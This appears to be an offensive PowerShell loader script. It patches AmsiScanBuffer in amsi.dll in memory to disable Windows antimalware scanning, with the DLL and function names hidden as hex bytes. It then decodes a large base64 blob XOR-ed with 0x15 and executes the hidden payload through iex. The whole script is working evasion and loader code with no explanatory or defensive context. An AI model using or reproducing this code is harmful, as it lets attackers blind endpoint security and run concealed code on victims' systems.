
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOFN0Z3hwZx9uHx81NTU1TlZ4cXlwYVd8e3F8e3I9PEgfNTU1NUV0Z3R4
NT0fNTU1NTU1NTVORmFnfHtySB81NTU1NTU1NTFWenh4dHtxNSg1NzcfHzU1NTU8Hx81NTU1MXQo
W3BiOFp3f3B2YTVcWjtYcHh6Z2xGYWdwdHg9OU5WentjcGdhSC8vU2d6eFdUZlAjIUZhZ3x7cj03
XSFmXFRUVFRUVFRQVFokdFEmVHZPJkM6cCY6J0F4c2VnX1tmbHMsJHl8JF1+dCdvOmN5Y3dYcHtz
InRcT1hgQndYdn5iQyNxJGFZfWAsY1kiZngnXUVUen92RXJUTHFMckNfWExfXCVZQXJhckBiZX5Z
RH19Q150b19EfSNAVFl9QHlfWG0lekQlZVl6TEBicjphIiIsYCxaLX5kRk94Ql5BRXEkdyIsJmNj
cDo+LCwmInAiYGRSJkV+fT5ccmdyYHsjcSNdWn5/ZyYlbWZ2WGd4f1FYJF0jcVhDTSR7IFpSOm9e
J2FdX2FXRUUnLHRQd0JBf15GWk1mYmdtWEFbYEE+TXwjQ2wtLD5XXEVSYFt4IXhkZGZ9I0MtcWJd
LFJyIGRzI31nOix4XnMmWixHXHwiRCd6eExyTEBDWSJUWlwhb2dlcGZxYXs6XndRLCVBc35BRz5z
UUFsc2BfZGBCY3FWOnAgRXwic2ReUWVFRD5dU2IhbFBndldmUiY6QCZ+ZV1/UHwjIllQRHQ+Y2Jt
RVNYbW9XcW0idyZZf3R8IiBNdHd8T1hfJyJXRiBjZlNdVndHeVlhLHA6VkNmWCdaeXleLWxYXmxn
IkR0PiJjeWBHY3BlPiYhR1ZxX1M+RV0tdGYjcX8nX3l0TSdvbW1lc1gsXHd0TXhsd353USNYRHN3
XFQiRVAhJyVFYlh6cn9Ab3B8WFknTC19U3dZbGdMVDpEU35iR1NnZFkjLVdkJ3hTbGNEJWJiRVxl
UCF9Ilp6YERPYXskQFlCW3gtV1lUJyVZbEB3LVNMXFJBQ3pHQFltXFlWIEd2YGQgIldYYHtEZ3BC
IVpsYExNITplZkxWJFBmJCNPbUBBRGdTRGBWIi1EW2VWJ19STV4nWn1BdFdMLVZZbCJPfWBicyxc
WCVMfEB6QGBdQycjI2RlelxCJUMgI21UJXEsRnRzcUd8e08+R1lCLEVdb0dxJ1BhYD5EJVRnIUFT
R11iJnZFREJmc306UF9dVHtEXX5sUmxlWX5fdlBbWUFjQ2Nke10gW39Rc1BlXX5MQzpPIGRYV1t3
bG1/TWNcT3dkXy1iR2FMQD53Z2dGLGNYZz5mTzpsb3YndnxlZiBQeCFheXRTICdHQ2BzTHckdH9c
ZTpZRydFdCRWb2dGQ3dAUiNDJ1hebXNtQUZeQEJgcFd7YycjJyRidnpnJGZhZ11cf0RUU0NleXh3
UlIkeVZiflJsXFNgJjoiWVJBcG97bXRcfkBAfWUgJl1bcEcldl5ZZ3RyRSdZUkdncj5keGQkYHpn
f3dmcUVeXENCb3tPRnpCd2ElQGFnZSFcViwmdmYmQFt2RDpMeCVXJnlHJmFBd0xDXT4kQ3ksJ2FB
T0BNbWNwOngiYl4sInRGVmJ8PmVkJlRhYSVGIiR7d1NQZnxYelxtRmV8fCBlR3NdZWFPQEJmJWF6
UmVyellYby1GOixifG9bXHEhY0daYlwmd0x8TVFaIE19J3xkXEMsQ3FhQiJ9Xl1xbSJDTUNNJyRS
XX9xdHAgfSVkIEF/f2BBJCMscXN/ekQmI0JTQ0FZLC17XX0tfnkkZEZkcW06R1FNInB8Xm9fYSIh
IGQjQF93UEwkfFlwc0M+fn9AbFNnQXN/bFRhWVRSR0NhJj5TW3phT3RHW1pHcV9meCRteS1aXyNd
Q00icGFXWSR2UXBnJHBdZiR/f11NWT5eJyBmZ2xvX3FEWH86R15gJV8mRGJ+WUNdQn99JENHYV5e
b21zIVdiJGdAQlRfV0xDUlw+R3pkeCZgfnx9YGRld11cUydlUiYldCxScFx3eG1dUW1+ZXNibVll
ZDpcJFlfW1J3dlRNVmJ9d0dMeGFbYH1nQl4+I3FDLFFmJ2RTc1FSeVkkdHhmUUxmIyVAZndaJ0Fm
ZGV6Qll3JnNBbCBSfV9eVmEjJWRxTHxdLWVWIFZbeS1lQ15jeVlfQyMnICZWInlQXmEhZ157cE19
bH06UltbbCdfQ39vQGFhIHZeZnxZdiRXZ0xmUkd/QFJ3VEwlJWdNc2RkQl1XYG0nZSJaTXYlIj52
JFdSImFwRyRgW3BtUyFeYEBFJFNzRCRsJFNjYXx8IEN7JUFZRWRlQ3skdnpvZV1wQSFkIWVHeUFn
fCxAZGBPemxgRkNed3p7XHdMclNYR2dTb3hMZkVXUyJbbWxBUkJaLH1xQGZTRyJCISZmcjpEdC1x
dGZNQVNWWFAgR0BWTHphWXYsXntPZldwbFl8eWVHenQ6U0IkLD46YlNjX2VnellUQyBMWTpRYGJ8
InokeCZ2ZCN8ZCJAfnZjdld3f3lZJExALGVGJnFveVJjb2FGXld0YWMtcVt0cUNifWZwQ2ZwZlkg
b2V3JGFQcEMscUNxeSxwWSJcWiNsYndNWGJNbyRZZl9BcFwjREV2Q1xjdGN9cnNGbCxkQj5PQ3F7
cF9ZTHs+VmBPdGRnR3F3I0Vsc099UltmY0Bbe0EsZyRPeGxxcHpgIVlTXWV0ekxheXljb1BTY3ls
VydmQyZlUGMtUWBCUFN4TCQsdFsnJ1htWTp7cSB2bFxGJmE6WnBbdD53RyN6PlkgLF5gdDpmXT4g
Q1N3eGd8JEF2Q3klUix0UWZ8YHdMWnZdbH1GZXMkIHZnRkJmdGd4W2V/Q2FaXUV+WkNjUSAgTCxc
LC1lT2B/TXE6QGYtY08iekZ3THtaYWYiJ11AYl9Ack9iUGd3Qk1GUSNSYCFzbW1WYFJse0wjcWxQ
Ym1vY0RWTGxQU20mT1xGPmElXCwmIyZ3cSdGclM6cHNUey1HUkN/TXt3XVJjRVJQIkJYcy1RQ00t
VFkjYGFPX3FzWWZEQWFfRXdbfSx0dnRzf3dWfUx9emZNeid+THZ9Z3BvbGAmcyRRUWdyQ21deixZ
QWNFIVwjd3NUb3NQJiJEe1RtJE1aeHRee2N/YlwjRUZvYntEXmc6VGw6XnAlc1ZxYn5ARVssVCJf
OmdvUC1eT0csY3JzLVphJ2NjYiZhZi1de3pYJVhaVlJxb3J5WFdffUZ/JnRQf3JxRSNtXSNMOicl
Z2Fbc1dbIUJ8U1dTcltmJFxnQkBjcnshX0wkLGAjbG1heSE6YiYjcV52WH13ei1cOk0iOnB4fz5C
ZVEkW21ZUSwhfGFZZ1BDJHd8LEFvfGMjJ295fEUgcEJFeU1zYlM+On5ecmdBXSxyb2ciLScmJUdg
cmN9cHFnTGdTVzpefl52Y2B8YV0sWFlFQD5AXl4lRiZgcS1sUXBZfHd4bEJnRUZNIGNQI39kZU9k
bHN/J0xZUl9zUUFUQnllUmVffyd6Zl5Xck1sd1JeeVd9UmdXd1RyZFlsfVZaLXIhWWdfT2RycFJH
fCN0YmAsdHxYVHRReyxNZF5XR3xgUWclUVpUYXpCdldZQng6ZXstV1hXLC1HYUV6d2JfcyV/eiR9
ICJNfWBFZiF3YEJFRyJ+VlIhTSJYZGxfIV86V3QjWXJjJSc6dEU+WXAgd0I+WVAnIWdWdFRsQyBe
dmdZY0xBbVcjckFieSdZIkBQTSxEVmFebUdMQWBUV3B7dyMtRFZDTHQ+Z2B7JX9jQF4+b0ZxZSVN
JXhEJXlWIE0lPkQmXj58e2EsIVcsZyNsY3xjIHlyIFxvIUJ2QyNBdmUiVHZXbWV0ICdSdyxDQlRF
JiNGJUVXTyFDTGNGWiBlWUJhR1hwQCJ7WkJ0U2BXJUY+XVZyV146WVFdb1tvOkV7TCJtZCVXI3FP
OnlHIU1seGRQUn9dRiNmelhwUVJhIFInWF9sYlR/cVFTfVsiRF8mVlBiXl1XVyFGWldtckR3ckB/
YiR2c2FgcnFYVk1tU2EsYmctUnAlX3d0RkwkZFdhVHFsciYlWVlhdixkRkN6WWBULEd/J1wtRX5B
cy1yPn1zQHF6U0VUU0NYbH9ce2BTe3JkPnl0I31zT1l0YXYsZ0JAZWQkb1RefyxeVyVXRFt0UDoi
byxYfSJ2XURRUSVTe2NmV3MhTE92U20iRV18T1FSJWItV1R6RVhfRSVGcyRHbHxhJkxwRz5EX2Ek
XyNyZT55bTpEQiNCOmFnOnRhIVB/Pn1zbSZwRWAsOnJ8IGVTJFQib0V+XnBbTF1jfmZjRHNYRSNf
WVRGYEJDcXkgf296OmRnYlo+RSNHZX8tXiZ0e2VAPmwgeCdRTWF5QFdccCBlPlMmIHAlYSFDTFgj
XXIlPkRlfyVGZGFEYHRBOkcjIkNePn94YVd+bFNCclMiVGUmdHJFT206JSJhXnQnXUF4ZUV0LC1b
QVRXYCVtcnBWUyZETGFlWTpjcWQiW2ZmcF8gXSRfdiVNc2ZxJ1klRXF5LVQidEV0RiRldyNaWnJm
WyVQdGNac2FUQXgnXC1UQydeUUYsVCNCclIhfkFMVHFyZC1HQlZFJVI6USdlfHJQdF12XEFXU2NM
VnteRHN6JVEnPkM+fnBwZlJ7bHN6c2V9TSVMTWRGeGdGLGZFcWMkWUJFJDpNVFFZeyJ/XXZ2UWV0
PlxzUW1lRXR8JlpzRiZ9dCF+c09XQEdGeFBeb0J0ZXN6Y0VMcE1fcW1kcCdyWW9wQ1tCJH9ZUlpw
d15wV01eUm9yJmdBZEBZdGx9eycsWH5aUmBncUR8cVp/V0ZYRH9kQ2FSJH9wfFZNWXptWiAtJ0cs
XXlvcTphQlJnQHJ9c2BgXEJhLV54RWB6QyZRcWNkWEBBVF1mY3hYeEFDb1lSZ3lwZidWfnYhIXAn
fVl3JiwmZmdgY2cicDpmJiQicSYse08lOnd/eiBhRUMncWNxYCdxZ3ckdyd7YyZhIkcmInh5c0Nh
TUIncXdwPnBCZ2MhfmBjZSJhZ0EmVD4menokIW9PTCd3VyVMXX0nfX4nfHhMJ3ZBVERNWVhienhX
eiBHJEBldHFGTCwgRUEkQl94W15bUCB8eyB+byJNRl5HfHFhJW18eyBFciFPdiZWZVFDWn0tJC1t
fnxPJFJbRSBiZkJheG9BbFZcdH5sdHIsQHJge3NZdEQjd39SV1h4f0dke0FGZXl/ck8jJSUicHZk
RyxwVmVNRlJzWzpnRk9ScSxjIFhPV1p4dHtWPnR6JE8sUmBicGBCWGJSXWJ3QVp3cUFCfnBbb19B
X2RGJCB3JVhyTG9+eF5EWHhRR2AnYiEjdEZZVEZ9dk9mXWVlYXxEOn4tQkRXUW0kf0A+f3RbIEBg
YiZnW2Z0eF9WTXRsR1xFYiV3RkF7fltZWnojT112YVh/I0xZViBfYUwsb1hSY3dlQGFwekxGWCw6
d3RHW3YsdCBHJ3BRXHE+JFlEcVFYRlt7QH9fZHNBUHlWJCR2eFsmZz54fiJdRz53ZHZeQnxEWnht
e397WUZ2UiFCXXdDR3lkZ1ZEJXNsJXtPI0xNWVRneG9xbCUjQFpxJXxTTX58RWVBRWVEeXljLG9H
VGMnUn9SV1l4WkNbXlBMLG1kcVgtRCF8e0YsZ1x2U0VTI0QnYF5+WC1dXl5EQFJRdnZdYXZ2Yn4m
THFvQXckY093ZlhtYSZ0ZVclZ1hge3h6Jyx9e1NhYkJwYmMmLH1jWl9FQ3tlclZ7IlFEcVgsXlNd
fFpBUkFbRmUsJ09YUm1PUkFlclN7f35DWiZFeER8YEZ4IVt4Q3tZe3t0R0xzTSxDWndTVFtseEQk
RXh5XXtQWHAkf0BWREBTRCxgQkBiJUFZJH5PZl9WbEAgeHx3JWRMdFsnWn5mUWx8fGRePnB2ZmBi
ZlN0b0FPeiNSf11GWl9yYFNjX2BbTGVZWEA+IlhlZyBvXkNFXmI6QndBfmx0V39ETUB7fnRsT3J4
IVp+JWJeRyRxZz5PRHRbciBBJSR4XX0mQCY+TXtwJyVkQnNGZlB5U20iRUFhUntARVNxYnghW2Ut
WnFAdlBRQ29aIl9lWVI+YEZEcFgsZmFXV2VbIEElX1hxbWEgWXIgZXgiXnxQbXNPdkdhcXhbYmdb
Yk8lbXQjW0J8cW1BJ0deeXJYIHRPeEV8ZVJcZ0IsWF1nQW1+QVp2Z1dSWiBEJXtzeEN9V010YV4m
LXxSeHNGdHFgIkVPQn5SXjpCfHlER3diXlp5YldNWkZaQnsnRlthIHtRVHRBfn1nXXhtPnZNUExd
fWdSJyd5cmRlQXQtYXhmQX1PTExicERiVmIgRXxfR0d6XFt/dy1xXHl/UkRMZFZHRVJ0dF5TUl9l
eEZeR21kIHFzUkB9dldiXW1/YGwjUlolb3tTc0d9JGx+eWxGQiMnbF1BY01SIkwlWmJWYHZ7Unxv
PlRSYV9/IGF9fS0+IWUlbHhEW0NNVFFWZ1pDOiFGe2Zve29xbCFbXydvT01bd3F+dFh4WWRFQnBF
QWZyb3ZPfiNvUXBtLVpMc3dlJlIgI353WFNaT39MQWR9dH1PQV5BLSBBdnt2W1N7IFAmJCZBbXgt
bFNXc1tyPlx6I2RzYGZ8eFlfISF3XlkiTWQmVnImLXYgImB3Y11aJyN0XnZ2Rno6YEJzUiBMfE1G
QVFzR09zPlBYI0Z7ekJ+J1tlUU9BZXhMdiZ/WSR7JVpSdHd5XE9PQz4+ZiNfZE9EJEBGQVlhR3xk
Jlt5Y3lvbXdCeF9RbFlRbUMiWSJnbCBHICM6Q3Bee2YiJGZGQVMkZCNcIl5vYk1cUlh8fmBxe3t2
ZF9sTSJmJlpmb0d3IGNacmBZfHx5Z1gnXk8+QnB5e2YmIyZnYkBTUlF5PixPeT4sXn50PkBlIUJ+
Q19NWEZnYnlBJ3BZJGVEc0MkbDpDdExzXnleYFNeJCBwRntHUyBfRiR+ZEJFXWN5cX8kcU17Y0Ik
QWVzIn5lQSNDZUxkeEZhTUVfXiUkbGd7YHFvYXEiXHNsWCdDLWR3d2Jgc3ZsWkx7IVNzd3glfV53
dHh3dyNRQmByYExdJCVRfC1HX2BCZXJTcVB8Jl5yQnRWfi1FZWMhb0dle1EtXnFNZy1UPldcckZY
WSJ9bVtyX1xGZEdiIUAlQHFaJVJ7XXMsLHhNYHp/cSJfImx2Z1FxcmMlVkcjd0VGc20lYGZtJXMm
UWAmXWA+dnpRcVt4Y0UteFxXWV0+YUJScWVsWnJSUj5eXHNUREw+ck9xWE9yQm1mVlklZWFWJy1a
Q3klVn9eYXZdQFRzX2FlZD59eWRHIW18ckNwTFZjZkF8W09leH1yI397VG93V0JEXXJPfkFyeE9s
Y3BtIEBzRmVfYVJGWVd+cnByT21UcFhFOmEhVydSeXdFfFJNY3dGYSdiYnttX3BRWFhNYiByelB3
WTpZfm1xQSdib2VSTFYmeixeXiVfLUxwIENCbUZWfUJwWSJBWlIiVHBwWHpTWEZNPm1WU39EUVtZ
JWZsb3YgRUVGcD5UWn0jUHImfVc6cUNGLH8tQUNRYVpZI2JRIVYnVCR6OiJTWX1AVkJ/Jmd3Jkc6
cTpAJ3p7f3tkXVF0XCZGQHRQcHJDYkZDZUVgJ0wmfl9SfnNneSBlZHdYc3kgZFhzc1cmVFNQcFdy
JmNhIXwkZCFsYzpXYkRkRXoneWB+OldQLVpvYVI+VCYhfnp3flstX1FEeUE6XXZHJFd/TXNRQD4g
TVJyOn1afEw+UURSWlRgLUI6fSNHRWx6J316QzpgOkRvRXx/IXR3cHMnJW15c0Z7R00gVkxSRz5Q
OkIjWFBaRXdtRHNge21BLWdYfHB5Q2J+dHc6THMjY0x7bXctPldsLUM6RFtTQkMjZXQmJXttcSx3
dF86RH53WiVvLXgsYSFgcF86ck1jIDpDTSxZICcjdjpsY2dETVR7byZYOmd7QCJPQGUkIVpvUCdM
Q29WLSNhWllzfSZYIzpXY1ImfmF3JW17bC19c0FcQ1hscmxgXmJndE97XXtDYXwgc3lxcCdhWyZE
ekJBTHMndj4sflp3dEF2e3ZsWlZYXG1kcH8iJWxHJFpsT2RlWC1Sb2F5fU1YUEUhXEdvcUQ6ZGx3
flF7XGF7c1dQIk9HelEmVCJ9VkUkVkwkf2NPcURnRVB5Im9UYCF9J3AjY3lET3tBYHBZeCBlRmFT
TVMmRjpCJVMicCF3TyAlYydGcmFRQnBQfiNFWW8iRX4sX1JzUG1CZFBfR2dhYiJNeSdmfmQneFZd
eUZcLXJRdiBBfm14TXtid3R0LXt/J3wlc2ZjJEVSZW93YkVRX2BGfSRhfntSbF9FTCEgcn93Q2xF
XSEnY3J4clFbUH5sYXldeC10fW8ibXpgbX14LVJwICxmYG9RJEBjZnsjbHJEJCJGYkUhI2xEbFhC
TG9BXmJTdnFWZC1aIXwsdFgkVG9DXVp6IH5yUz53RnR4TWF/WDp2XXxCZXhZflBUY3FePllFVl5v
ZUFDRHF3UFBeREVDWHcsUEV6REJnUk9/IUZURFJ2IVBWcyV+bU9xXURveltBRU1Ee11Cc1Yldm1d
JkNmfVEgc1FAb3skckNWUn4kcSFQQ3JaVEBzXGxgVlBDZyJkem10LFwkc3BTeltXZXBCZUUkR3N5
TF1HQ29BYmEtQ2BWJFxdUHN6V09xbUJlWGBYcD4jUGRee0wnYCxkWHNWU2ZcIyxAdGdDIFE6en94
R2J/ekwiOiEmb1J9flc+ZnxRQmA+QnpfcmdAcmImPkRSflkkYGchIyNTJkdwRlZkfmI6JnZQJyQg
eWF0WDpaXmF6d3ZCbX14cnlNQ2xTRkdfUE9DTXhWXntMcXchRn97ekdnQHhnIHo+WUV7Im9sI2Na
ZiJ5Jm0jJ15xXTpNZVt7JTomIU13dmctc3xzf2whLXFWYWRkXHJfLU1bUX5ER3RDfW9zYmAnfWMs
R1twZGdaIXRNJXJbQmdjfSxPTUFGYWYhI1Jjf0BBLVRCdHRGIiYlIXpkUVJ5TWRadCFlcCQ+V3Bj
bXBYcXdHJGFHUXFnYVkgZ30gUCNhTSRncCdhImRnJ2FhQmAiJXEhI3FkZX90J2EiIGIjf3Yjb1En
W11HZkwnekBkW0RwI15bQSNcfX9DTHlRY0ZbU2ctZnd7XjpUYCU+JSBNTHh4fF15LFB5bUAiPkdl
em1lci1UTXZfRi1CX0VNWXJRQmNSIj5fPiwtZHBFUF57c2R9b1Nxd1JzIFFxeSBAcyRNX0RafzpG
WnNdQSwsISxmY0JFRSFZQnB7OjoibGUsPnhzLVtHbyUiIi1EWXNzIFoscEJ7W0xgTTpETXRxJGV/
dyI6b2Zffm1RdnElRkx7LT5XfyAsZUBmZ0VfPkV3f1RQcSRNf2UmemZwbD52I08tXV9bYyZkdE9S
WCx+JlsiZ0FHQXNGIGdFXWJ/ZHpNV1NPU1N5Q01BbTpdVz5yYj5zf1AldkEiZ1l2VyxCY2xEZlos
QTpCd3ZjRFpxf11nXVxFOnlzLVE+WEZzRXJGQ0Z4YyxHQSNwLXxnZWJHWnJdTH0jdm9zfnoifEUm
bVdaIV1mUkVcZ29NZSd2VEVzJF0jQSZtXyAjJWBTZFEgOj5+fSN9TXRAQ3t9PiJSJy0nZ1pnJ3At
IzpWbU1kR1IlQmBUI2RWOiJYQ1l/fi1TWGNvf1RzfUB+VydccSF2d1twJU17Z3d8J0xDe106IWUg
cmdfRyE6Zl9DeyZ0dkdtW0FwQixwTVM6f0Z8W0xBRVoiT0ZWUWxwY0MiT3okWXxHJiNaeyZaPnRX
XTpRUUd2X3txQCx4dHt/Uz4sRyZ6TSckflA6cl0meHZ4QlshW1h4QXNwZ3gnQkVATWJmTyxkXFhx
RUNtWHwlRkUiJmdHIVpWU0U+Z0RUWUAiTSBbQnZNI0QjbV0jWSBeXn5HISZcWkVWZkJRIHFvV2d9
fExDLEVwf2RGImA+cGddeCZhUXt9WkclQkV3enZwb3w6RUdAe2NzIGBwbEZNWCJ5eyA6Rz5ze3ZZ
f19fdlFyRmJtfS14JXdQd2xBJn1seHwiIHZDLUQ6OiBZeXFhICJZT2BfeyZZQiNQcGEgTCxtJTot
YG1gOl1cdF06ZyxmdCFAb1dsISV3UmxleCJSI3FbZTpdQkVDQkdkZnJgYjolY0FXYmR2ZiJgbXx+
ImEsW19BT2VPYid7W2V5WicgQ3x7VmQlZV4iY0F2WV5fWD4nWy10bEdGIC1se3ZZR3Z7YURTei1N
eUQnWHgieVZgf1QsbWx2PlI+WCAiV1IiUiFweH46eS1fZSdGOmxYeX9dbD52d0VGQFlWe3tYX1Qi
ZUEkX2MmZUBfTH0jd31zcFMldlNTYSxCUXddPkE+fiNMYiBMQWVjQHhhe0wkU1lgRyBmVHR+ZSx7
f0RFUlt4IX14UmBtZltPbFcmbX9lYSd6Jm1kQUc6WHtxciFfRkd2QGImXlNSbHBEU2NFW3YmbzpT
LCQ+T3xQelFjJ2BieXFEOiw+eiMsI39xTXdxYT5/QXc6OjpyOnY6YntsRmVdZ3JUbFRUVCg3PDwf
NTU1NTFxcHZ6eGVncGZmcHE1KDVbcGI4Wnd/cHZhNVxaO1Z6eGVncGZmfHp7O1JvfGVGYWdwdHg9
MXQ5TlxaO1Z6eGVncGZmfHp7O1Z6WEVncGZmfHp7WHpxcEgvL1FQVnp4RWdwZmY8HzU1NTUxemBh
ZWBhNSg1W3BiOFp3f3B2YTVGbGZhcHg7XFo7WHB4emdsRmFncHR4HzU1NTUxcXB2enhlZ3BmZnBx
O1Z6ZWxBej01MXpgYWVgYTU8HzU1NTVOd2xhcE5ISDUxd2xhcFpgYVRnZ3RsNSg1MXpgYWVgYTtB
elRnZ3RsPTwfNTU1NTFHVEY1KDVORmxmYXB4O0dwc3lwdmF8ens7VGZmcHh3eWxILy9ZenRxPTF3
bGFwWmBhVGdndGw8Hx81NTU1MVp5cVZ6e2Z6eXBaYGE1KDVOVnp7Znp5cEgvL1pgYR81NTU1MUZh
Z3x7ckJnfGFwZzUoNVtwYjhad39wdmE1XFo7RmFnfHtyQmd8YXBnHzU1NTVOVnp7Znp5cEgvL0Zw
YVpgYT0xRmFnfHtyQmd8YXBnPB8fNTU1NU5TIWd4Jmc7RWd6cmd0eEgvL3h0fHs9MVZ6eHh0e3E7
RmV5fGE9NzU3PDwfHzU1NTVOVnp7Znp5cEgvL0ZwYVpgYT0xWnlxVnp7Znp5cFpgYTwfNTU1NTFH
cGZgeWFmNSg1MUZhZ3x7ckJnfGFwZztBekZhZ3x7cj08HzU1NTUxR3BmYHlhZh81NR9oHw=="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

